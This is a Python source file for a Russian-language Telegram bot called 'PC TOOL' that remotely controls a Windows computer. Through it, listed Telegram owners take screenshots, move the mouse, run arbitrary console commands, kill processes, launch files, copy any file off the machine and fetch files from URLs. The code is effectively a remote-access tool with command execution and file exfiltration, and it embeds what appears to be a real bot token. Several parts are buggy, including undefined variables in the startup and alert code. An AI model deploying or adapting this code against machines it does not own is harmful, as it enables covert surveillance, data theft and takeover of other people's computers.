

##########################################################################################################################
########################      Автор не несёт ответсвенности за использование данного скрипта      ########################
########################  Данный скрипт создан для упрощенного и защищенного управления СВОИМ ПК  ########################
##########################################################################################################################



import telebot
import os
import time
import webbrowser
import requests
import platform
import shutil
import ctypes
import mouse
import psutil
import PIL.ImageGrab
import subprocess
from subprocess import Popen, PIPE
import xml.etree.ElementTree as ET
from PIL import Image, ImageGrab, ImageDraw
from pySmartDL import SmartDL
from telebot import types
from telebot import apihelper


######Примеры прокси
#apihelper.proxy = {'https':'socks5://userproxy:password@proxy_address:port'}
#apihelper.proxy = {'http':'mtproto://password@proxy:port'}
#apihelper.proxy = {'https': 'socks5://proxy:port'}
#apihelper.proxy = {'https': 'http://proxy:port'}

bot_token = '8329928139:AAH0vYxWd3N1S71eOP3MZUQy6j-b4MRbylY'
bot = telebot.TeleBot(bot_token)
owners = [7907427297, 6281970050]


user_dict = {}

class User:
	def __init__(self):
		keys = ['urldown', 'fin', 'curs']

		for key in keys:
			self.key = None

User.curs = 50


##Клавиатура меню
menu_keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True,one_time_keyboard=False)
btnscreen = types.KeyboardButton('📷Сделать скриншот')
btnmouse = types.KeyboardButton('🖱Управление мышкой')
btnfiles = types.KeyboardButton('📂Файлы и процессы')
btnaddit = types.KeyboardButton('❇️Дополнительно')
btnmsgbox = types.KeyboardButton('📩Отправка уведомления')
btninfo = types.KeyboardButton('❗️Информация')
menu_keyboard.row(btnscreen, btnmouse)
menu_keyboard.row(btnfiles, btnaddit)
menu_keyboard.row(btninfo, btnmsgbox)


#Клавиатура Файлы и Процессы
files_keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True,one_time_keyboard=False)
btnstart = types.KeyboardButton('✔️Запустить')
btnkill = types.KeyboardButton('❌Замочить процесс')
btndown = types.KeyboardButton('⬇️Скачать файл')
btnupl = types.KeyboardButton('⬆️Загрузить файл')
btnurldown = types.KeyboardButton('🔗Загрузить по ссылке')
btnback = types.KeyboardButton('⏪Назад⏪')
files_keyboard.row(btnstart,  btnkill)
files_keyboard.row(btndown, btnupl)
files_keyboard.row(btnurldown, btnback)


#Клавиатура Дополнительно
additionals_keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True,one_time_keyboard=False)
btnweb = types.KeyboardButton('🔗Перейти по ссылке')
btncmd = types.KeyboardButton('✅Выполнить команду')
btnoff = types.KeyboardButton('⛔️Выключить компьютер')
btnreb = types.KeyboardButton('♻️Перезагрузить компьютер')
btninfo = types.KeyboardButton('🖥О компьютере')
btnback = types.KeyboardButton('⏪Назад⏪')
additionals_keyboard.row(btnoff, btnreb)
additionals_keyboard.row(btncmd, btnweb)
additionals_keyboard.row(btninfo, btnback)


#Клавиатура мышь
mouse_keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=False)
btnup = types.KeyboardButton('⬆️')
btndown = types.KeyboardButton('⬇️')
btnleft = types.KeyboardButton('⬅️')
btnright = types.KeyboardButton('➡️')
btnclick = types.KeyboardButton('🆗')
btnback = types.KeyboardButton('⏪Назад⏪')
btncurs = types.KeyboardButton('Указать размах курсора')
mouse_keyboard.row(btnup)
mouse_keyboard.row(btnleft, btnclick, btnright)
mouse_keyboard.row(btndown)
mouse_keyboard.row(btnback, btncurs)






info_msg = '''
*О командах*

_📷Сделать скриншот_ - делает скриншот экрана вместе с мышкой
_🖱Управление мышкой_ - переходит меню управления мышкой
_📂Файлы и процессы_ - переходит в меню с управлением файлов и процессов
_❇️Дополнительно_ - переходит в меню с доп. функциями
_📩Отправка уведомления_ - пришлет на ПК окно с сообщением(msgbox)
_⏪Назад⏪_ - возвращает в главное меню

_🔗Перейти по ссылке_ - переходит по указанной ссылке(важно указать "http://" или "https://" для открытия ссылки в стандартном браузере, а не IE)
_✅Выполнить команду_ - выполняет в cmd любую указанную команду
_⛔️Выключить компьютер_ - моментально выключает компьютер
_♻️Перезагрузить компьютер_ - моментально перезагружает компьютер
_🖥О компьютере_ - показыввает имя пользователя, ip, операционную систему и процессор

_❌Замочить процесс_ - завершает любой процесс
_✔️Запустить_ - открывает любые файлы(в том числе и exe)
_⬇️Скачать файл_ - скачивает указанный файл с вашего компьютера
_⬆️Загрузить файл_ - загружает файл на ваш компьютер
_🔗Загрузить по ссылке_ - загружает файл на ваш компьютер по прямой ссылке



'''

MessageBox = ctypes.windll.user32.MessageBoxW
if os.path.exists("msg.pt"):
	pass
else:
	bot.send_message(message.from_user.id, "Советую сначала прочитать все в меню \"❗️Информация\"", parse_mode="markdown")
	MessageBox(None, f'На вашем ПК запущена программа PC TOOL для управления компьютером\nДанное сообщения является разовым', '!ВНИМАНИЕ!', 0)
	f = open('msg.pt', 'tw', encoding='utf-8')
	f.close
for owner_id in owners:
 bot.send_message(owner_id, "ПК запущен", reply_markup = menu_keyboard)


@bot.message_handler(content_types=["text"])
def get_text_messages(message):
	if message.from_user.id in owners:
		bot.send_chat_action(message.from_user.id, 'typing')
		if message.text == "📷Сделать скриншот":
			bot.send_chat_action(message.from_user.id, 'upload_photo')
			try:
				currentMouseX, currentMouseY  =  mouse.get_position()
				img = PIL.ImageGrab.grab()
				img.save("screen.png", "png")
				img = Image.open("screen.png")
				draw = ImageDraw.Draw(img)
				draw.polygon((currentMouseX, currentMouseY, currentMouseX, currentMouseY + 15, currentMouseX + 10, currentMouseY + 10), fill="white", outline="black")
				img.save("screen_with_mouse.png", "PNG")
				bot.send_photo(message.from_user.id, open("screen_with_mouse.png", "rb"))
				os.remove("screen.png")
				os.remove("screen_with_mouse.png")
			except:
				bot.send_message(message.from_user.id, "Компьютер заблокирован")
				
		elif message.text == "🖱Управление мышкой":
			bot.send_message(message.from_user.id, "🖱Управление мышкой", reply_markup = mouse_keyboard)
			bot.register_next_step_handler(message, mouse_process)

		elif message.text == "⏪Назад⏪":
			back(message)

		elif message.text == "📂Файлы и процессы":
			bot.send_message(message.from_user.id, "📂Файлы и процессы", reply_markup = files_keyboard)
			bot.register_next_step_handler(message, files_process)
		
		elif message.text == "❇️Дополнительно":
			bot.send_message(message.from_user.id, "❇️Дополнительно", reply_markup = additionals_keyboard)
			bot.register_next_step_handler(message, addons_process)

		elif message.text == "📩Отправка уведомления":
			bot.send_message(message.from_user.id, "Укажите текст уведомления:")
			bot.register_next_step_handler(message, messaga_process)

		elif message.text == "❗️Информация":
			bot.send_message(message.from_user.id, info_msg, parse_mode = "markdown")

		else:
			pass

	else:
		info_user(message)


def addons_process(message):
	if message.from_user.id in owners:
		bot.send_chat_action(message.from_user.id, 'typing')
		if message.text == "🔗Перейти по ссылке":
			bot.send_message(message.from_user.id, "Укажите ссылку: ")
			bot.register_next_step_handler(message, web_process)

		elif message.text == "✅Выполнить команду":
			bot.send_message(message.from_user.id, "Укажите консольную команду: ")
			bot.register_next_step_handler(message, cmd_process)

		elif message.text == "⛔️Выключить компьютер":
			markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
			markup.add("⏳ Выключить через 30 минут", "⏳ Выключить через 1 час")
			markup.add("⏳ Выключить через 2 часа", "⏳ Выключить через 2.5 часа")
			markup.add("🔌 Выключить сразу", "❌ Отменить отключение")
			bot.send_message(message.from_user.id, "Выберите время для выключения компьютера:", reply_markup=markup)
			bot.register_next_step_handler(message, process_shutdown_choice)

		elif message.text == "♻️Перезагрузить компьютер":
			bot.send_message(message.from_user.id, "Перезагрузка компьютера...")
			os.system('shutdown -r /t 0 /f')
			bot.register_next_step_handler(message, addons_process)

		elif message.text == "🖥О компьютере":
			req = requests.get('http://ipv4.seeip.org')
			ip = req.text
			uname = os.getlogin()
			windows = platform.platform()
			processor = platform.processor()
			cpu_usage = psutil.cpu_percent(interval=1)  # Нагрузка на ЦП
			memory_info = psutil.virtual_memory()  # Информация об оперативной памяти
			memory_usage = memory_info.percent  # Процент использования оперативной памяти
			disk_usage = psutil.disk_usage('/').percent  # Процент использования диска
			#print(*[line.decode('cp866', 'ignore') for line in Popen('tasklist', stdout=PIPE).stdout.readlines()])
			bot.send_message(message.from_user.id, f"*Пользователь:* {uname}\n*IP:* {ip}\n*ОС:* {windows}\n*Процессор:* {processor}\n*Нагрузка на ЦП:* {cpu_usage}%\n*Использование ОП:* {memory_usage}%\n*Использование диска:* {disk_usage}%", parse_mode="markdown")

			bot.register_next_step_handler(message, addons_process)

		elif message.text == "⏪Назад⏪":
			back(message)
		
		else:
			pass

	else:
		info_user(message)

def files_process(message):
	if message.from_user.id in owners:
		bot.send_chat_action(message.from_user.id, 'typing')
		if message.text == "❌Замочить процесс":
			tasklist = subprocess.check_output(['tasklist'], encoding='utf-8')
			with open('tasklist.txt', 'w', encoding='utf-8') as f:
			 f.write(tasklist)
			with open('tasklist.txt', 'rb') as f:
			 bot.send_document(message.from_user.id, f)
			os.remove('tasklist.txt')
			bot.send_message(message.from_user.id, "Укажите название процесса: ")
		elif message.text == "⏪Назад⏪":
			back(message)
			bot.register_next_step_handler(message, kill_process)

		elif message.text == "✔️Запустить":		
			bot.send_message(message.from_user.id, "Укажите путь до файла: ")
			bot.register_next_step_handler(message, start_process)

		elif message.text == "⬇️Скачать файл":
			bot.send_message(message.from_user.id, "Укажите путь до файла: ")
			bot.register_next_step_handler(message, downfile_process)

		elif message.text == "⬆️Загрузить файл":
			bot.send_message(message.from_user.id, "Отправьте необходимый файл")
			bot.register_next_step_handler(message, uploadfile_process)

		elif message.text == "🔗Загрузить по ссылке":
			bot.send_message(message.from_user.id, "Укажите прямую ссылку скачивания:")
			bot.register_next_step_handler(message, uploadurl_process)

		elif message.text == "⏪Назад⏪":
			back(message)

		else:
			pass
	else:
		info_user(message)


def mouse_process(message):
	if message.from_user.id in owners:
		if message.text == "⬆️":
			currentMouseX,  currentMouseY  =  mouse.get_position()
			mouse.move(currentMouseX,  currentMouseY - User.curs)
			screen_process(message)

		elif message.text == "⬇️":
			currentMouseX,  currentMouseY  =  mouse.get_position()
			mouse.move(currentMouseX,  currentMouseY + User.curs)
			screen_process(message)

		elif message.text == "⬅️":
			currentMouseX,  currentMouseY  =  mouse.get_position()
			mouse.move(currentMouseX - User.curs,  currentMouseY)
			screen_process(message)

		elif message.text == "➡️":
			currentMouseX,  currentMouseY  =  mouse.get_position()
			mouse.move(currentMouseX + User.curs,  currentMouseY)
			screen_process(message)

		elif message.text == "🆗":
			mouse.click()
			screen_process(message)

		elif message.text == "Указать размах курсора":
			bot.send_chat_action(message.from_user.id, 'typing')
			bot.send_message(message.from_user.id, f"Укажите размах, в данный момент размах {str(User.curs)}px", reply_markup = mouse_keyboard)
			bot.register_next_step_handler(message, mousecurs_settings)

		elif message.text == "⏪Назад⏪":
			back(message)

		else:
			pass
	else:
		info_user(message)


def back(message):
	bot.register_next_step_handler(message, get_text_messages)
	bot.send_message(message.from_user.id, "Вы в главном меню", reply_markup = menu_keyboard)

def info_user(message):
	bot.send_chat_action(owner_id, 'typing')
	alert = f"Кто-то пытался задать команду: \"{message.text}\"\n\n"
	alert += f"user id: {str(message.from_user.id)}\n"
	alert += f"first name: {str(message.from_user.first_name)}\n"
	alert += f"last name: {str(message.from_user.last_name)}\n" 
	alert += f"username: @{str(message.from_user.username)}"
	bot.send_message(owner_id, alert, reply_markup = menu_keyboard)

def kill_process (message):
	bot.send_chat_action(message.from_user.id, 'typing')
	try:
		os.system("taskkill /IM " + message.text + " -F")
		bot.send_message(message.from_user.id, f"Процесс \"{message.text}\" убит", reply_markup = files_keyboard)
		bot.register_next_step_handler(message, files_process)
	except:
		bot.send_message(message.from_user.id, "Ошибка! Процесс не найден", reply_markup = files_keyboard)
		bot.register_next_step_handler(message, files_process)

def start_process (message):
	bot.send_chat_action(message.from_user.id, 'typing')
	try:
		os.startfile(r'' + message.text)
		bot.send_message(message.from_user.id, f"Файл по пути \"{message.text}\" запустился", reply_markup = files_keyboard)
		bot.register_next_step_handler(message, files_process)
	except:
		bot.send_message(message.from_user.id, "Ошибка! Указан неверный файл", reply_markup = files_keyboard)
		bot.register_next_step_handler(message, files_process)

def web_process (message):
	bot.send_chat_action(message.from_user.id, 'typing')
	try:
		webbrowser.open(message.text, new=0)
		bot.send_message(message.from_user.id, f"Переход по ссылке \"{message.text}\" осуществлён", reply_markup = additionals_keyboard)
		bot.register_next_step_handler(message, addons_process)
	except:
		bot.send_message(message.from_user.id, "Ошибка! ссылка введена неверно")
		bot.register_next_step_handler(message, addons_process)

def cmd_process (message):
	bot.send_chat_action(message.from_user.id, 'typing')
	try:
		os.system(message.text)
		bot.send_message(message.from_user.id, f"Команда \"{message.text}\" выполнена", reply_markup = additionals_keyboard)
		bot.register_next_step_handler(message, addons_process)
	except:
		bot.send_message(message.from_user.id, "Ошибка! Неизвестная команда")
		bot.register_next_step_handler(message, addons_process)

def say_process(message):
	bot.send_chat_action(message.from_user.id, 'typing')
	bot.send_message(message.from_user.id, "В разработке...", reply_markup = menu_keyboard)

def downfile_process(message):
	bot.send_chat_action(message.from_user.id, 'typing')
	try:
		file_path = message.text
		if os.path.exists(file_path):
			bot.send_message(message.from_user.id, "Файл загружается, подождите...")
			bot.send_chat_action(message.from_user.id, 'upload_document')
			file_doc = open(file_path, 'rb')
			bot.send_document(message.from_user.id, file_doc)
			bot.register_next_step_handler(message, files_process)
		else:
			bot.send_message(message.from_user.id, "Файл не найден или указан неверный путь (ПР.: C:\\Documents\\File.doc)")
			bot.register_next_step_handler(message, files_process)
	except:
		bot.send_message(message.from_user.id, "Ошибка! Файл не найден или указан неверный путь (ПР.: C:\\Documents\\File.doc)")
		bot.register_next_step_handler(message, files_process)

def uploadfile_process(message):
	bot.send_chat_action(message.from_user.id, 'typing')
	try:
		file_info = bot.get_file(message.document.file_id)
		downloaded_file = bot.download_file(file_info.file_path)
		src = message.document.file_name
		with open(src, 'wb') as new_file:
			new_file.write(downloaded_file)
		bot.send_message(message.from_user.id, "Файл успешно загружен")
		bot.register_next_step_handler(message, files_process)
	except:
		bot.send_message(message.from_user.id, "Ошибка! Отправьте файл как документ")
		bot.register_next_step_handler(message, files_process)

def process_shutdown_choice(message):
		if message.text == "🔌 Выключить сразу":
			bot.send_message(message.from_user.id, "Выключение компьютера...")
			os.system('shutdown -s /t 0 /f')
			back(message)
		elif message.text == "⏳ Выключить через 30 минут":
			bot.send_message(message.from_user.id, "Компьютер будет выключен через 30 минут...")
			os.system('shutdown -s /t 1800')  # 30 минут в секундах
			back(message)
		elif message.text == "⏳ Выключить через 1 час":
			bot.send_message(message.from_user.id, "Компьютер будет выключен через 1 час...")
			os.system('shutdown -s /t 3600')  # 1 час в секундах
			back(message)
		elif message.text == "⏳ Выключить через 2 часа":
			bot.send_message(message.from_user.id, "Компьютер будет выключен через 2 часа...")
			os.system('shutdown -s /t 7200')  # 2 часа в секундах
			back(message)
		elif message.text == "⏳ Выключить через 2.5 часа":
			bot.send_message(message.from_user.id, "Компьютер будет выключен через 2.5 часа...")
			os.system('shutdown -s /t 9000')  # 2.5 часа в секундах
			back(message)
		elif message.text == "❌ Отменить отключение":
			bot.send_message(message.from_user.id, "Запланированное выключение отменено")
			os.system('shutdown /a')  # отключение запланированного выключения
			back(message)
		else:
			bot.send_message(message.from_user.id, "Некорректный выбор, попробуйте еще раз.")
			shutdown_menu(message)

def uploadurl_process(message):
	bot.send_chat_action(message.from_user.id, 'typing')
	User.urldown = message.text
	bot.send_message(message.from_user.id, "Укажите путь сохранения файла:")
	bot.register_next_step_handler(message, uploadurl_2process)	

def uploadurl_2process(message):
	bot.send_chat_action(message.from_user.id, 'typing')
	try:
		User.fin = message.text
		obj = SmartDL(User.urldown, User.fin, progress_bar=False)
		obj.start()
		bot.send_message(message.from_user.id, f"Файл успешно сохранён по пути \"{User.fin}\"")
		bot.register_next_step_handler(message, files_process)
	except:
		bot.send_message(message.from_user.id, "Указаны неверная ссылка или путь")
		bot.register_next_step_handler(message, addons_process)

def messaga_process(message):
	bot.send_chat_action(message.from_user.id, 'typing')
	try:
		MessageBox(None, message.text, 'PC TOOL', 0)
		bot.send_message(message.from_user.id, f"Уведомление с текстом \"{message.text}\" было закрыто")
	except:
		bot.send_message(message.from_user.id, "Ошибка")

def mousecurs_settings(message):
	bot.send_chat_action(message.from_user.id, 'typing')
	if is_digit(message.text) == True:
		User.curs = int(message.text)
		bot.send_message(message.from_user.id, f"Размах курсора изменен на {str(User.curs)}px", reply_markup = mouse_keyboard)
		bot.register_next_step_handler(message, mouse_process)
	else:
		bot.send_message(message.from_user.id, "Введите целое число: ", reply_markup = mouse_keyboard)
		bot.register_next_step_handler(message, mousecurs_settings)

def screen_process(message):
	try:
		currentMouseX, currentMouseY  =  mouse.get_position()
		img = PIL.ImageGrab.grab()
		img.save("screen.png", "png")
		img = Image.open("screen.png")
		draw = ImageDraw.Draw(img)
		draw.polygon((currentMouseX, currentMouseY, currentMouseX, currentMouseY + 15, currentMouseX + 10, currentMouseY + 10), fill="white", outline="black")
		img.save("screen_with_mouse.png", "PNG")
		bot.send_photo(message.from_user.id, open("screen_with_mouse.png", "rb"))
		bot.register_next_step_handler(message, mouse_process)
		os.remove("screen.png")
		os.remove("screen_with_mouse.png")
	except:
			bot.send_chat_action(message.from_user.id, 'typing')
			bot.send_message(message.from_user.id, "Компьютер заблокирован")
			bot.register_next_step_handler(message, mouse_process)
	

def is_digit(string):
	if string.isdigit():
		return True
	else:
		try:
			float(string)
			return True
		except ValueError:
			return False


while True:
	try:
		bot.polling(none_stop=True, interval=0, timeout=20)
	except Exception as E:
		print(E.args)
		time.sleep(2)
